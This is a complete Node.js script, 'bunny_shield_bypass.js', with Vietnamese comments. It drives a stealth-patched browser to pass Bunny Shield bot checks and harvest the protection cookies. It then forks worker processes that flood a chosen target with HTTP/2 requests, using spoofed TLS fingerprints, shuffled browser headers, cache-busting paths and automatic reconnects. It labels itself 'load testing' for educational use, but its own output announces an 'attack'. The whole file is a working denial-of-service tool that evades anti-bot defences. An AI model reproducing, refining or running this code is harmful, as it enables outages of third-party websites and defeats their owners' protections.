const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");

// ========== CẤU HÌNH TLS/HTTP2 (GIỮ NGUYÊN TỪ CODE MẪU) ==========
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    sigalgs: sigalgs.join(':'),
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
});

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
];

const cache_header = [
    'no-cache',
    'max-age=0',
    'no-cache, no-store, must-revalidate',
    'no-store',
    'no-cache, no-store, private, max-age=0'
];

const language_header = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-GB,en;q=0.9'
];

// ========== XỬ LÝ ARGUMENTS ==========
if (process.argv.length < 6) {
    console.log("\x1b[31mUsage: node bunny_shield_bypass.js <target> <time> <rate> <threads> <sessionCount>\x1b[0m");
    console.log("\x1b[33mExample: node bunny_shield_bypass.js https://example.com 60 5 4 6\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    sessionCount: parseInt(process.argv[6]) || 2
};

const parsedTarget = url.parse(args.target);

// ========== HÀM FLOOD (ĐÃ CHỈNH SỬA DÙNG BUNNY COOKIES) ==========
function flood(userAgent, cookieString) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path || '/';
        
        // Thêm cache-busting parameter
        if (path === '/' || !path.includes('?')) {
            path += `?_=${Date.now()}_${generateRandomString(4, 8)}`;
        }

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let interval = randomDelay(300, 1500);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            return match && match[1] ? match[1] : "120.0.0.0";
        }

        const chromever = getChromeVersion(userAgent);
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9",
            "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9",
            "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ur-PK,ur;q=0.9", "tr-TR,tr;q=0.9",
            "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9",
            "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9",
            "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"
        ];

        let fixed = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookieString, // DÙNG COOKIE BUNNY
            "accept": randValue(accept_header),
            "sec-ch-ua": `"Chromium";v="${chromever}", "Not)A;Brand";v="8", "Chrome";v="${chromever}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
                "accept-language": randValue(lang_header1) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
            }),
            "priority": "u=0, i",
            "te": "trailers"
        };

        let randomHeaders = {
            ...(Math.random() < 0.3 ? { "x-requested-with": "XMLHttpRequest" } : {}),
            ...(Math.random() < 0.4 ? { "dnt": "1" } : {}),
            ...(Math.random() < 0.3 ? { "save-data": "on" } : {})
        };

        let headerPositions = [
            "accept-language",
            "sec-fetch-user",
            "sec-ch-ua-platform",
            "accept",
            "sec-ch-ua",
            "sec-ch-ua-mobile",
            "accept-encoding",
            "priority"
        ];

        let headersArray = Object.entries(fixed);
        let shuffledRandomHeaders = Object.entries(randomHeaders).sort(() => Math.random() - 0.5);

        shuffledRandomHeaders.forEach(([key, value]) => {
            let insertAfter = headerPositions[Math.floor(Math.random() * headerPositions.length)];
            let index = headersArray.findIndex(([k, v]) => k === insertAfter);
            if (index !== -1) {
                headersArray.splice(index + 1, 0, [key, value]);
            }
        });

        let dynHeaders = Object.fromEntries(headersArray);

        const secureOptionsList = [
            crypto.constants.SSL_OP_NO_RENEGOTIATION,
            crypto.constants.SSL_OP_NO_TICKET,
            crypto.constants.SSL_OP_NO_SSLv2,
            crypto.constants.SSL_OP_NO_SSLv3,
            crypto.constants.SSL_OP_NO_COMPRESSION,
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            crypto.constants.SSL_OP_TLSEXT_PADDING,
            crypto.constants.SSL_OP_ALL
        ];

        function createCustomTLSSocket(parsed) {
            const tlsSocket = tls.connect({
                host: parsed.host,
                port: 443,
                servername: parsed.host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2"],
                rejectUnauthorized: false,
                sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                ecdhCurve: "X25519:P-256:P-384",
                ...(Math.random() < 0.5
                    ? { secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)] }
                    : {})
            });
            tlsSocket.setKeepAlive(true, 600000 * 1000);
            return tlsSocket;
        }

        const tlsSocket = createCustomTLSSocket(parsed);
        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                "NO_RFC7540_PRIORITIES": Math.random() < 0.5 ? true : "1"
            }
        }, (session) => {
            session.setLocalWindowSize(12517377 + 65535);
        });

        client.on("connect", () => {
            let clearr = setInterval(async () => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request({ ...dynHeaders }, {
                        weight: Math.random() < 0.5 ? 42 : 256,
                        depends_on: 0,
                        exclusive: false
                    });

                    request.on("response", (res) => {
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        if (res[":status"] === 429 || res[":status"] === 403) {
                            interval = 20000;
                            client.close();
                        }
                    });
                    
                    request.on("error", () => {
                        global.failedRequests = (global.failedRequests || 0) + 1;
                    });
                    
                    request.end();
                }
            }, interval);

            let goawayCount = 0;
            client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                let backoff = Math.min(1000 * Math.pow(2, goawayCount), 15000);
                setTimeout(() => {
                    goawayCount++;
                    client.destroy();
                    tlsSocket.destroy();
                    flood(userAgent, cookieString);
                }, backoff);
            });

            client.on("close", () => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookieString);
            });

            client.on("error", (error) => {
                client.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookieString);
            });
        });

        client.on("error", (error) => {
            client.destroy();
            tlsSocket.destroy();
        });
    } catch (err) {
        // console.log(`Error in flood function: ${err.message}`);
    }
}

// ========== HELPER FUNCTIONS ==========
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}

// ========== BUNNY SHIELD BYPASS CORE ==========
async function bypassBunnyShieldOnce(attemptNum = 1) {
    let browser = null;
    let page = null;
    
    try {
        console.log(`\x1b[33m[BUNNY] Starting bypass attempt ${attemptNum}...\x1b[0m`);
        
        const response = await connect({
            headless: false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--window-size=1920,1080',
                '--lang=en-US,en'
            ],
            connectOption: {
                defaultViewport: null,
                ignoreHTTPSErrors: true
            }
        });
        
        browser = response.browser;
        page = response.page;
        
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        });
        
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        await page.setUserAgent(userAgents[Math.floor(Math.random() * userAgents.length)]);
        
        console.log(`\x1b[33m[BUNNY] Accessing ${args.target}...\x1b[0m`);
        
        try {
            await page.goto(args.target, {
                waitUntil: 'networkidle2',
                timeout: 45000
            });
        } catch (navError) {
            console.log(`\x1b[33m[BUNNY] Navigation warning: ${navError.message}\x1b[0m`);
        }
        
        console.log("\x1b[33m[BUNNY] Waiting for Bunny Shield cookies...\x1b[0m");
        
        let bunnyCookiesFound = false;
        let checkCount = 0;
        const maxChecks = 90;
        const targetCookies = ['bunny_shield_chk', 'bunny_DRKID', 'bunny_shield'];
        
        while (!bunnyCookiesFound && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 500));
            
            try {
                const cookies = await page.cookies();
                const cookieNames = cookies.map(c => c.name);
                
                const foundTargetCookies = targetCookies.filter(name => 
                    cookieNames.includes(name)
                );
                
                if (foundTargetCookies.length >= 2) {
                    console.log(`\x1b[32m[BUNNY] Found cookies: ${foundTargetCookies.join(', ')} after ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);
                    bunnyCookiesFound = true;
                    
                    const bunnyCookieDetails = {};
                    targetCookies.forEach(name => {
                        const cookie = cookies.find(c => c.name === name);
                        if (cookie) {
                            bunnyCookieDetails[name] = cookie.value;
                            console.log(`\x1b[36m[BUNNY] ${name}: ${cookie.value.substring(0, 40)}...\x1b[0m`);
                        }
                    });
                    
                    const userAgent = await page.evaluate(() => navigator.userAgent);
                    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                    
                    await page.close();
                    await browser.close();
                    
                    return {
                        cookies: cookies,
                        userAgent: userAgent,
                        bunnyCookies: bunnyCookieDetails,
                        cookieString: cookieString,
                        success: true,
                        attemptNum: attemptNum
                    };
                }
                
                const isBlocked = await page.evaluate(() => {
                    const bodyText = document.body?.innerText || '';
                    const title = document.title || '';
                    return bodyText.includes('Access denied') || 
                           bodyText.includes('blocked') ||
                           title.includes('Security Check');
                });
                
                if (isBlocked) {
                    console.log(`\x1b[31m[BUNNY] Blocked at attempt ${attemptNum}\x1b[0m`);
                    break;
                }
                
            } catch (e) {}
            
            checkCount++;
            if (checkCount % 10 === 0) {
                console.log(`\x1b[33m[BUNNY] Still checking... (${(checkCount * 0.5).toFixed(1)}s)\x1b[0m`);
            }
        }
        
        await page.close();
        await browser.close();
        
        console.log(`\x1b[31m[BUNNY] No Bunny cookies found after ${maxChecks * 0.5}s\x1b[0m`);
        return {
            cookies: [],
            userAgent: userAgents[0],
            bunnyCookies: {},
            cookieString: '',
            success: false,
            attemptNum: attemptNum
        };
        
    } catch (error) {
        console.log(`\x1b[31m[BUNNY] Bypass error ${attemptNum}: ${error.message}\x1b[0m`);
        
        try {
            if (page) await page.close();
            if (browser) await browser.close();
        } catch {}
        
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            bunnyCookies: {},
            cookieString: '',
            success: false,
            attemptNum: attemptNum
        };
    }
}

async function bypassBunnyShieldParallel(totalCount) {
    console.log("\x1b[35m=== BUNNY SHIELD BYPASS - PARALLEL MODE ===\x1b[0m");
    console.log(`\x1b[36mTarget sessions: ${totalCount}\x1b[0m`);
    
    const results = [];
    let attemptCount = 0;
    
    while (results.length < totalCount) {
        const concurrentSessions = Math.min(8, totalCount - results.length);
        
        console.log(`\n\x1b[33mStarting batch (${concurrentSessions} sessions)...\x1b[0m`);
        
        const batchPromises = [];
        for (let i = 0; i < concurrentSessions; i++) {
            attemptCount++;
            batchPromises.push(bypassBunnyShieldOnce(attemptCount));
        }
        
        const batchResults = await Promise.all(batchPromises);
        
        for (const result of batchResults) {
            if (result.success && Object.keys(result.bunnyCookies).length >= 2) {
                results.push(result);
                console.log(`\x1b[32m✓ Session ${result.attemptNum} successful! (Total: ${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31m✗ Session ${result.attemptNum} failed\x1b[0m`);
            }
        }
        
        if (results.length < totalCount) {
            const delay = 400;
            console.log(`\x1b[33mWaiting ${(delay/1000).toFixed(1)}s before next batch...\x1b[0m`);
            await new Promise(r => setTimeout(r, delay));
        }
    }
    
    console.log(`\n\x1b[32m✓ Successfully obtained ${results.length} Bunny Shield sessions!\x1b[0m`);
    return results;
}

// ========== STATISTICS DISPLAY ==========
function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35m=== BUNNY SHIELD LOAD TESTING ===\x1b[0m");
    console.log(`\x1b[36mTarget:\x1b[0m ${args.target}`);
    console.log(`\x1b[36mTime:\x1b[0m ${elapsed}s / ${args.time}s (${remaining}s remaining)`);
    console.log(`\x1b[36mConfig:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads} | Sessions: ${global.bypassData ? global.bypassData.length : 0}`);
    console.log("\x1b[33mStatistics:\x1b[0m");
    console.log(`   \x1b[32mSuccess:\x1b[0m ${global.successRequests || 0}`);
    console.log(`   \x1b[31mFailed:\x1b[0m ${global.failedRequests || 0}`);
    console.log(`   \x1b[36mTotal:\x1b[0m ${global.totalRequests || 0}`);
    console.log(`   \x1b[33mSpeed:\x1b[0m ${elapsed > 0 ? ((global.totalRequests || 0)/elapsed).toFixed(2) : 0} req/s`);
    
    const total = global.totalRequests || 0;
    const success = global.successRequests || 0;
    console.log(`   \x1b[32mSuccess rate:\x1b[0m ${total > 0 ? ((success/total)*100).toFixed(2) : 0}%`);
    
    if (remaining > 0) {
        const progress = Math.floor((elapsed / args.time) * 30);
        const progressBar = "#".repeat(progress) + "-".repeat(30 - progress);
        console.log(`\n\x1b[36mProgress: [${progressBar}]\x1b[0m`);
    }
}

// ========== RUN FLOODER FUNCTION ==========
function runFlooder() {
    const bypassInfo = randomElement(global.bypassData || []);
    if (!bypassInfo || !bypassInfo.cookieString) return;

    flood(bypassInfo.userAgent, bypassInfo.cookieString);
}

// ========== MAIN EXECUTION ==========
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m=== BUNNY SHIELD LOAD TESTING TOOL ===\x1b[0m");
    console.log("\x1b[33mFOR EDUCATIONAL PURPOSES ONLY - USE ON YOUR OWN WEBSITES!\x1b[0m\n");
    
    (async () => {
        const bypassResults = await bypassBunnyShieldParallel(args.sessionCount);
        
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32m✓ Starting attack with ${bypassResults.length} Bunny sessions...\x1b[0m`);
        console.log(`\x1b[33m✓ Cookies obtained: bunny_shield_chk, bunny_DRKID, bunny_shield\x1b[0m\n`);
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults 
            });
        }
        
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ 
                    type: 'bypassData', 
                    data: bypassResults 
                });
            }
        });
        
        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            console.log("\n\x1b[32m✓ Attack completed!\x1b[0m");
            console.log(`\x1b[36mFinal statistics:\x1b[0m`);
            console.log(`   Total requests: ${global.totalRequests}`);
            console.log(`   Success: ${global.successRequests}`);
            console.log(`   Failed: ${global.failedRequests}`);
            console.log(`   Bunny sessions used: ${bypassResults.length}`);
            console.log(`   Bunny cookies: bunny_shield_chk, bunny_DRKID, bunny_shield`);
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    let workerBypassData = [];
    let attackInterval;
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            workerBypassData = msg.data;
            global.bypassData = msg.data;
            
            attackInterval = setInterval(() => {
                for (let i = 0; i < 15; i++) {
                    runFlooder();
                }
            }, 50);
            
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
    
    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        process.exit(0);
    }, args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
